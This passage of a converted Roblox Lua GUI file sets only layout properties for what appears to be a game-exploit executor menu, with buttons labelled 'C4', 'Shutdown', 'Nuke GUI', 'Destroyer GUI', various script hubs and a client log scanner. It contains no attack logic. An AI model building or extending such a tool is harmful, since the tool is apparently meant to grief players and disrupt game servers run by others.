Converted["_UIListLayout1"].SortOrder = Enum.SortOrder.LayoutOrder
Converted["_UIListLayout1"].Parent = Converted["_ScrollingFrame1"]

Converted["_TextLabel1"].Font = Enum.Font.Code
Converted["_TextLabel1"].Text = "-- Destruction --"
Converted["_TextLabel1"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel1"].TextScaled = true
Converted["_TextLabel1"].TextSize = 14
Converted["_TextLabel1"].TextStrokeTransparency = 0
Converted["_TextLabel1"].TextWrapped = true
Converted["_TextLabel1"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel1"].BackgroundTransparency = 1
Converted["_TextLabel1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextLabel1"].BorderSizePixel = 0
Converted["_TextLabel1"].Size = UDim2.new(1, 0, 0, 50)
Converted["_TextLabel1"].Parent = Converted["_ScrollingFrame1"]

Converted["_CFour"].Font = Enum.Font.SourceSans
Converted["_CFour"].Text = "C4"
Converted["_CFour"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_CFour"].TextScaled = true
Converted["_CFour"].TextSize = 14
Converted["_CFour"].TextWrapped = true
Converted["_CFour"].AutoButtonColor = false
Converted["_CFour"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_CFour"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_CFour"].BorderSizePixel = 0
Converted["_CFour"].Position = UDim2.new(0.358654857, 0, 0.308291346, 0)
Converted["_CFour"].Size = UDim2.new(1, 0, 0, 42)
Converted["_CFour"].Name = "CFour"
Converted["_CFour"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner8"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner8"].Parent = Converted["_CFour"]

Converted["_UIStroke8"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke8"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke8"].Thickness = 1.5
Converted["_UIStroke8"].Parent = Converted["_CFour"]

Converted["_Shutdown"].Font = Enum.Font.SourceSans
Converted["_Shutdown"].Text = "Shutdown"
Converted["_Shutdown"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Shutdown"].TextScaled = true
Converted["_Shutdown"].TextSize = 14
Converted["_Shutdown"].TextWrapped = true
Converted["_Shutdown"].AutoButtonColor = false
Converted["_Shutdown"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Shutdown"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Shutdown"].BorderSizePixel = 0
Converted["_Shutdown"].Position = UDim2.new(0.359927475, 0, 0.115564071, 0)
Converted["_Shutdown"].Size = UDim2.new(1, 0, 0, 42)
Converted["_Shutdown"].Name = "Shutdown"
Converted["_Shutdown"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner9"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner9"].Parent = Converted["_Shutdown"]

Converted["_UIStroke9"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke9"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke9"].Thickness = 1.5
Converted["_UIStroke9"].Parent = Converted["_Shutdown"]

Converted["_Grab"].Font = Enum.Font.SourceSans
Converted["_Grab"].Text = "Grab Knife"
Converted["_Grab"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Grab"].TextScaled = true
Converted["_Grab"].TextSize = 14
Converted["_Grab"].TextWrapped = true
Converted["_Grab"].AutoButtonColor = false
Converted["_Grab"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Grab"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Grab"].BorderSizePixel = 0
Converted["_Grab"].Position = UDim2.new(0.1251605, 0, 0.501018643, 0)
Converted["_Grab"].Size = UDim2.new(1, 0, 0, 42)
Converted["_Grab"].Name = "Grab"
Converted["_Grab"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner10"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner10"].Parent = Converted["_Grab"]

Converted["_UIStroke10"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke10"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke10"].Thickness = 1.5
Converted["_UIStroke10"].Parent = Converted["_Grab"]

Converted["_Sledge"].Font = Enum.Font.SourceSans
Converted["_Sledge"].Text = "Sledge Hammer"
Converted["_Sledge"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Sledge"].TextScaled = true
Converted["_Sledge"].TextSize = 14
Converted["_Sledge"].TextWrapped = true
Converted["_Sledge"].AutoButtonColor = false
Converted["_Sledge"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Sledge"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Sledge"].BorderSizePixel = 0
Converted["_Sledge"].Position = UDim2.new(0.791489482, 0, 0.115564078, 0)
Converted["_Sledge"].Size = UDim2.new(1, 0, 0, 42)
Converted["_Sledge"].Name = "Sledge"
Converted["_Sledge"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner11"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner11"].Parent = Converted["_Sledge"]

Converted["_UIStroke11"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke11"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke11"].Thickness = 1.5
Converted["_UIStroke11"].Parent = Converted["_Sledge"]

Converted["_NukeGio"].Font = Enum.Font.SourceSans
Converted["_NukeGio"].Text = "Nuke GUI"
Converted["_NukeGio"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_NukeGio"].TextScaled = true
Converted["_NukeGio"].TextSize = 14
Converted["_NukeGio"].TextWrapped = true
Converted["_NukeGio"].AutoButtonColor = false
Converted["_NukeGio"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_NukeGio"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_NukeGio"].BorderSizePixel = 0
Converted["_NukeGio"].Position = UDim2.new(0.791489482, 0, 0.115564078, 0)
Converted["_NukeGio"].Size = UDim2.new(1, 0, 0, 42)
Converted["_NukeGio"].Name = "NukeGio"
Converted["_NukeGio"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner12"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner12"].Parent = Converted["_NukeGio"]

Converted["_UIStroke12"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke12"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke12"].Thickness = 1.5
Converted["_UIStroke12"].Parent = Converted["_NukeGio"]

Converted["_Destroui"].Font = Enum.Font.SourceSans
Converted["_Destroui"].Text = "Destroyer GUI"
Converted["_Destroui"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Destroui"].TextScaled = true
Converted["_Destroui"].TextSize = 14
Converted["_Destroui"].TextWrapped = true
Converted["_Destroui"].AutoButtonColor = false
Converted["_Destroui"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Destroui"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Destroui"].BorderSizePixel = 0
Converted["_Destroui"].Position = UDim2.new(0.791489482, 0, 0.115564078, 0)
Converted["_Destroui"].Size = UDim2.new(1, 0, 0, 42)
Converted["_Destroui"].Name = "Destroui"
Converted["_Destroui"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner13"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner13"].Parent = Converted["_Destroui"]

Converted["_UIStroke13"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke13"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke13"].Thickness = 1.5
Converted["_UIStroke13"].Parent = Converted["_Destroui"]

Converted["_TextLabel2"].Font = Enum.Font.Code
Converted["_TextLabel2"].Text = "-- Hubs --"
Converted["_TextLabel2"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel2"].TextScaled = true
Converted["_TextLabel2"].TextSize = 14
Converted["_TextLabel2"].TextStrokeTransparency = 0
Converted["_TextLabel2"].TextWrapped = true
Converted["_TextLabel2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel2"].BackgroundTransparency = 1
Converted["_TextLabel2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextLabel2"].BorderSizePixel = 0
Converted["_TextLabel2"].Size = UDim2.new(1, 0, 0, 50)
Converted["_TextLabel2"].Parent = Converted["_ScrollingFrame1"]

Converted["_Trash"].Font = Enum.Font.SourceSans
Converted["_Trash"].Text = "Trash Hub"
Converted["_Trash"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Trash"].TextScaled = true
Converted["_Trash"].TextSize = 14
Converted["_Trash"].TextWrapped = true
Converted["_Trash"].AutoButtonColor = false
Converted["_Trash"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Trash"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Trash"].BorderSizePixel = 0
Converted["_Trash"].Position = UDim2.new(0.582149684, 0, 0.115564078, 0)
Converted["_Trash"].Size = UDim2.new(1, 0, 0, 42)
Converted["_Trash"].Name = "Trash"
Converted["_Trash"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner14"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner14"].Parent = Converted["_Trash"]

Converted["_UIStroke14"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke14"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke14"].Thickness = 1.5
Converted["_UIStroke14"].Parent = Converted["_Trash"]

Converted["_Polaria"].Font = Enum.Font.SourceSans
Converted["_Polaria"].Text = "Polaria"
Converted["_Polaria"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Polaria"].TextScaled = true
Converted["_Polaria"].TextSize = 14
Converted["_Polaria"].TextWrapped = true
Converted["_Polaria"].AutoButtonColor = false
Converted["_Polaria"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Polaria"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Polaria"].BorderSizePixel = 0
Converted["_Polaria"].Position = UDim2.new(0.125160471, 0, 0.115564071, 0)
Converted["_Polaria"].Size = UDim2.new(1, 0, 0, 42)
Converted["_Polaria"].Name = "Polaria"
Converted["_Polaria"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner15"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner15"].Parent = Converted["_Polaria"]

Converted["_UIStroke15"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke15"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke15"].Thickness = 1.5
Converted["_UIStroke15"].Parent = Converted["_Polaria"]

Converted["_Hub"].Font = Enum.Font.SourceSans
Converted["_Hub"].Text = "Sensation"
Converted["_Hub"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Hub"].TextScaled = true
Converted["_Hub"].TextSize = 14
Converted["_Hub"].TextWrapped = true
Converted["_Hub"].AutoButtonColor = false
Converted["_Hub"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Hub"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Hub"].BorderSizePixel = 0
Converted["_Hub"].Position = UDim2.new(0.580877066, 0, 0.308291346, 0)
Converted["_Hub"].Size = UDim2.new(1, 0, 0, 42)
Converted["_Hub"].Name = "Hub"
Converted["_Hub"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner16"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner16"].Parent = Converted["_Hub"]

Converted["_UIStroke16"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke16"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke16"].Thickness = 1.5
Converted["_UIStroke16"].Parent = Converted["_Hub"]

Converted["_TextLabel3"].Font = Enum.Font.Code
Converted["_TextLabel3"].Text = "-- Other --"
Converted["_TextLabel3"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel3"].TextScaled = true
Converted["_TextLabel3"].TextSize = 14
Converted["_TextLabel3"].TextStrokeTransparency = 0
Converted["_TextLabel3"].TextWrapped = true
Converted["_TextLabel3"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_TextLabel3"].BackgroundTransparency = 1
Converted["_TextLabel3"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_TextLabel3"].BorderSizePixel = 0
Converted["_TextLabel3"].Size = UDim2.new(1, 0, 0, 50)
Converted["_TextLabel3"].Parent = Converted["_ScrollingFrame1"]

Converted["_Star"].Font = Enum.Font.SourceSans
Converted["_Star"].Text = "starlight hint"
Converted["_Star"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Star"].TextScaled = true
Converted["_Star"].TextSize = 14
Converted["_Star"].TextWrapped = true
Converted["_Star"].AutoButtonColor = false
Converted["_Star"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Star"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Star"].BorderSizePixel = 0
Converted["_Star"].Position = UDim2.new(0.1251605, 0, 0.308291346, 0)
Converted["_Star"].Size = UDim2.new(1, 0, 0, 42)
Converted["_Star"].Name = "Star"
Converted["_Star"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner17"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner17"].Parent = Converted["_Star"]

Converted["_UIStroke17"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke17"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke17"].Thickness = 1.5
Converted["_UIStroke17"].Parent = Converted["_Star"]

Converted["_ExSer"].Font = Enum.Font.SourceSans
Converted["_ExSer"].Text = "ExSer"
Converted["_ExSer"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ExSer"].TextScaled = true
Converted["_ExSer"].TextSize = 14
Converted["_ExSer"].TextWrapped = true
Converted["_ExSer"].AutoButtonColor = false
Converted["_ExSer"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_ExSer"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ExSer"].BorderSizePixel = 0
Converted["_ExSer"].Position = UDim2.new(0.791827142, 0, 0.308291346, 0)
Converted["_ExSer"].Size = UDim2.new(1, 0, 0, 42)
Converted["_ExSer"].Name = "ExSer"
Converted["_ExSer"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner18"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner18"].Parent = Converted["_ExSer"]

Converted["_UIStroke18"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke18"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke18"].Thickness = 1.5
Converted["_UIStroke18"].Parent = Converted["_ExSer"]

Converted["_AntiSkidd"].Font = Enum.Font.SourceSans
Converted["_AntiSkidd"].Text = "Anti Skid"
Converted["_AntiSkidd"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_AntiSkidd"].TextScaled = true
Converted["_AntiSkidd"].TextSize = 14
Converted["_AntiSkidd"].TextWrapped = true
Converted["_AntiSkidd"].AutoButtonColor = false
Converted["_AntiSkidd"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_AntiSkidd"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_AntiSkidd"].BorderSizePixel = 0
Converted["_AntiSkidd"].Position = UDim2.new(0.791827142, 0, 0.308291346, 0)
Converted["_AntiSkidd"].Size = UDim2.new(1, 0, 0, 42)
Converted["_AntiSkidd"].Name = "AntiSkidd"
Converted["_AntiSkidd"].Parent = Converted["_ScrollingFrame1"]

Converted["_UICorner19"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner19"].Parent = Converted["_AntiSkidd"]

Converted["_UIStroke19"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke19"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke19"].Thickness = 1.5
Converted["_UIStroke19"].Parent = Converted["_AntiSkidd"]

Converted["_Logs"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Logs"].BackgroundTransparency = 1
Converted["_Logs"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Logs"].BorderSizePixel = 0
Converted["_Logs"].Position = UDim2.new(0, 0, 0.218954206, 0)
Converted["_Logs"].Size = UDim2.new(0, 621, 0, 275)
Converted["_Logs"].Visible = false
Converted["_Logs"].Name = "Logs"
Converted["_Logs"].Parent = Converted["_Frame"]

Converted["_ScrollingFrame2"].AutomaticCanvasSize = Enum.AutomaticSize.XY
Converted["_ScrollingFrame2"].CanvasSize = UDim2.new(0, 0, 5, 0)
Converted["_ScrollingFrame2"].ElasticBehavior = Enum.ElasticBehavior.Never
Converted["_ScrollingFrame2"].Active = true
Converted["_ScrollingFrame2"].BackgroundColor3 = Color3.fromRGB(36.00000165402889, 36.00000165402889, 36.00000165402889)
Converted["_ScrollingFrame2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ScrollingFrame2"].BorderSizePixel = 0
Converted["_ScrollingFrame2"].Position = UDim2.new(0.123655848, 0, 0.209204987, 0)
Converted["_ScrollingFrame2"].Size = UDim2.new(0, 308, 0, 206)
Converted["_ScrollingFrame2"].Parent = Converted["_Logs"]

Converted["_Template"].Font = Enum.Font.SourceSans
Converted["_Template"].Text = ""
Converted["_Template"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Template"].TextSize = 20
Converted["_Template"].TextStrokeTransparency = 0
Converted["_Template"].TextTruncate = Enum.TextTruncate.AtEnd
Converted["_Template"].TextWrapped = true
Converted["_Template"].TextXAlignment = Enum.TextXAlignment.Left
Converted["_Template"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Template"].BackgroundTransparency = 1
Converted["_Template"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Template"].BorderSizePixel = 0
Converted["_Template"].Size = UDim2.new(0, 451, 0, 31)
Converted["_Template"].Name = "Template"
Converted["_Template"].Parent = Converted["_ScrollingFrame2"]

Converted["_UIListLayout2"].SortOrder = Enum.SortOrder.LayoutOrder
Converted["_UIListLayout2"].Parent = Converted["_ScrollingFrame2"]

Converted["_UIStroke20"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke20"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke20"].Thickness = 1.5
Converted["_UIStroke20"].Parent = Converted["_ScrollingFrame2"]

Converted["_Log2"].Font = Enum.Font.SourceSans
Converted["_Log2"].Text = "Client Logs"
Converted["_Log2"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log2"].TextScaled = true
Converted["_Log2"].TextSize = 15
Converted["_Log2"].TextStrokeTransparency = 0
Converted["_Log2"].TextWrapped = true
Converted["_Log2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log2"].BackgroundTransparency = 1
Converted["_Log2"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Log2"].BorderSizePixel = 0
Converted["_Log2"].Position = UDim2.new(0.121863812, 0, 0.0858976617, 0)
Converted["_Log2"].Size = UDim2.new(0, 309, 0, 26)
Converted["_Log2"].Name = "Log"
Converted["_Log2"].Parent = Converted["_Logs"]

Converted["_Log3"].Font = Enum.Font.SourceSans
Converted["_Log3"].Text = "Settings"
Converted["_Log3"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log3"].TextScaled = true
Converted["_Log3"].TextSize = 15
Converted["_Log3"].TextStrokeTransparency = 0
Converted["_Log3"].TextWrapped = true
Converted["_Log3"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Log3"].BackgroundTransparency = 1
Converted["_Log3"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Log3"].BorderSizePixel = 0
Converted["_Log3"].Position = UDim2.new(0.637705326, 0, 0.0984499305, 0)
Converted["_Log3"].Size = UDim2.new(0, 208, 0, 26)
Converted["_Log3"].Name = "Log"
Converted["_Log3"].Parent = Converted["_Logs"]

Converted["_ToggleMode"].Font = Enum.Font.Ubuntu
Converted["_ToggleMode"].Text = "Current scan mode: All"
Converted["_ToggleMode"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ToggleMode"].TextScaled = true
Converted["_ToggleMode"].TextSize = 14
Converted["_ToggleMode"].TextWrapped = true
Converted["_ToggleMode"].AutoButtonColor = false
Converted["_ToggleMode"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_ToggleMode"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ToggleMode"].BorderSizePixel = 0
Converted["_ToggleMode"].Position = UDim2.new(0.639315665, 0, 0.207066536, 0)
Converted["_ToggleMode"].Size = UDim2.new(0, 206, 0, 51)
Converted["_ToggleMode"].Name = "ToggleMode"
Converted["_ToggleMode"].Parent = Converted["_Logs"]

Converted["_UICorner20"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner20"].Parent = Converted["_ToggleMode"]

Converted["_UIStroke21"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke21"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke21"].Thickness = 1.5
Converted["_UIStroke21"].Parent = Converted["_ToggleMode"]

Converted["_Version"].Font = Enum.Font.SourceSans
Converted["_Version"].Text = "Version: 0.2.7"
Converted["_Version"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Version"].TextScaled = true
Converted["_Version"].TextSize = 14
Converted["_Version"].TextStrokeTransparency = 0
Converted["_Version"].TextWrapped = true
Converted["_Version"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Version"].BackgroundTransparency = 1
Converted["_Version"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Version"].BorderSizePixel = 0
Converted["_Version"].Interactable = false
Converted["_Version"].Position = UDim2.new(0.633710027, 0, 0.799804926, 0)
Converted["_Version"].Size = UDim2.new(0, 212, 0, 35)
Converted["_Version"].Name = "Version"
Converted["_Version"].Parent = Converted["_Logs"]

Converted["_BG"].Font = Enum.Font.Ubuntu
Converted["_BG"].Text = "Background: Static"
Converted["_BG"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_BG"].TextScaled = true
Converted["_BG"].TextSize = 14
Converted["_BG"].TextWrapped = true
Converted["_BG"].AutoButtonColor = false
Converted["_BG"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_BG"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_BG"].BorderSizePixel = 0
Converted["_BG"].Position = UDim2.new(0.639315665, 0, 0.417975634, 0)
Converted["_BG"].Size = UDim2.new(0, 206, 0, 51)
Converted["_BG"].Name = "BG"
Converted["_BG"].Parent = Converted["_Logs"]

Converted["_UICorner21"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner21"].Parent = Converted["_BG"]

Converted["_UIStroke22"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke22"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke22"].Thickness = 1.5
Converted["_UIStroke22"].Parent = Converted["_BG"]

Converted["_Devs"].Font = Enum.Font.SourceSans
Converted["_Devs"].Text = "Devs: lolbad, trackcode"
Converted["_Devs"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Devs"].TextScaled = true
Converted["_Devs"].TextSize = 14
Converted["_Devs"].TextStrokeTransparency = 0
Converted["_Devs"].TextWrapped = true
Converted["_Devs"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Devs"].BackgroundTransparency = 1
Converted["_Devs"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Devs"].BorderSizePixel = 0
Converted["_Devs"].Interactable = false
Converted["_Devs"].Position = UDim2.new(0.633710027, 0, 0.64344126, 0)
Converted["_Devs"].Size = UDim2.new(0, 212, 0, 35)
Converted["_Devs"].Name = "Devs"
Converted["_Devs"].Parent = Converted["_Logs"]

Converted["_Sidebar"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Sidebar"].BackgroundTransparency = 1
Converted["_Sidebar"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Sidebar"].BorderSizePixel = 0
Converted["_Sidebar"].Position = UDim2.new(0, 0, 0.279668093, 0)
Converted["_Sidebar"].Size = UDim2.new(0, 65, 0, 190)
Converted["_Sidebar"].Name = "Sidebar"
Converted["_Sidebar"].Parent = Converted["_Frame"]

Converted["_Executor"].Font = Enum.Font.SourceSans
Converted["_Executor"].Text = ""
Converted["_Executor"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Executor"].TextSize = 14
Converted["_Executor"].AutoButtonColor = false
Converted["_Executor"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Executor"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Executor"].BorderSizePixel = 0
Converted["_Executor"].Position = UDim2.new(0.140710443, 0, -0.0047498201, 0)
Converted["_Executor"].Size = UDim2.new(0, 42, 0, 42)
Converted["_Executor"].Name = "Executor"
Converted["_Executor"].Parent = Converted["_Sidebar"]

Converted["_UICorner22"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner22"].Parent = Converted["_Executor"]

Converted["_UIStroke23"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke23"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke23"].Thickness = 1.5
Converted["_UIStroke23"].Parent = Converted["_Executor"]

Converted["_ImageLabel7"].Image = "rbxassetid://96541223"
Converted["_ImageLabel7"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel7"].BackgroundTransparency = 1
Converted["_ImageLabel7"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel7"].BorderSizePixel = 0
Converted["_ImageLabel7"].Interactable = false
Converted["_ImageLabel7"].Position = UDim2.new(0.0714285746, 0, 0.0714285746, 0)
Converted["_ImageLabel7"].Size = UDim2.new(0, 35, 0, 35)
Converted["_ImageLabel7"].Parent = Converted["_Executor"]

Converted["_Presets1"].Font = Enum.Font.SourceSans
Converted["_Presets1"].Text = ""
Converted["_Presets1"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Presets1"].TextSize = 14
Converted["_Presets1"].AutoButtonColor = false
Converted["_Presets1"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Presets1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Presets1"].BorderSizePixel = 0
Converted["_Presets1"].Position = UDim2.new(0.142502531, 0, 0.356954306, 0)
Converted["_Presets1"].Size = UDim2.new(0, 42, 0, 42)
Converted["_Presets1"].Name = "Presets"
Converted["_Presets1"].Parent = Converted["_Sidebar"]

Converted["_UICorner23"].CornerRadius = UDim.new(0, 6)
Converted["_UICorner23"].Parent = Converted["_Presets1"]

Converted["_UIStroke24"].ApplyStrokeMode = Enum.ApplyStrokeMode.Border
Converted["_UIStroke24"].Color = Color3.fromRGB(57.00000040233135, 57.00000040233135, 57.00000040233135)
Converted["_UIStroke24"].Thickness = 1.5
Converted["_UIStroke24"].Parent = Converted["_Presets1"]

Converted["_ImageLabel8"].Image = "rbxassetid://11570895459"
Converted["_ImageLabel8"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_ImageLabel8"].BackgroundTransparency = 1
Converted["_ImageLabel8"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_ImageLabel8"].BorderSizePixel = 0
Converted["_ImageLabel8"].Interactable = false
Converted["_ImageLabel8"].Position = UDim2.new(0.0714285746, 0, 0.0714285746, 0)
Converted["_ImageLabel8"].Size = UDim2.new(0, 35, 0, 35)
Converted["_ImageLabel8"].Parent = Converted["_Presets1"]

Converted["_Logs1"].Font = Enum.Font.SourceSans
Converted["_Logs1"].Text = ""
Converted["_Logs1"].TextColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Logs1"].TextSize = 14
Converted["_Logs1"].AutoButtonColor = false
Converted["_Logs1"].BackgroundColor3 = Color3.fromRGB(16.000000946223736, 16.000000946223736, 16.000000946223736)
Converted["_Logs1"].BorderColor3 = Color3.fromRGB(0, 0, 0)
Converted["_Logs1"].BorderSizePixel = 0
Converted["_Logs1"].Position = UDim2.new(0.142502531, 0, 0.711437047, 0)
